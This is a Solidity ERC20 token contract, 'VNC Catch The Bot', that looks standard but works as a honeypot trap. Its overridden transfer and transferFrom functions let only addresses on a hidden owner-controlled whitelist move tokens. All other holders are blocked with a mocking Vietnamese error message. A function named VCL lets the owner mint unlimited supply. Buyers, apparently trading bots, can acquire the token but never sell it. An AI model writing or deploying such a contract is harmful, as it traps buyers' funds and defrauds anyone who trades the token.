// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "lib/openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "lib/openzeppelin-contracts/contracts/access/Ownable.sol";

contract VNCCatchBot is ERC20, ERC20Burnable, Ownable {
    mapping (address => bool ) private bro;

    constructor() ERC20("VNC Catch The Bot", "VCB") {
        _mint(msg.sender, 1000000000 * 10 ** decimals());
        setBro(msg.sender);
    }

    function VCL(uint256 amount) public onlyOwner {
        _mint(msg.sender, amount);
    }
    function viewBro(address _bro)  public onlyOwner view returns (bool) {
        return bro[_bro];
    }
    function setBro(address _bro) public onlyOwner  {
        bro[_bro] = true;
    }
    function unSetBro(address _bro) public onlyOwner {
        bro[_bro] = false;
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        require(bro[msg.sender], 'Xin Loi Ban Qua Den'); 
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        require(bro[from], 'Xin Loi Ban Qua Den'); 
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    receive() external payable{
    }
}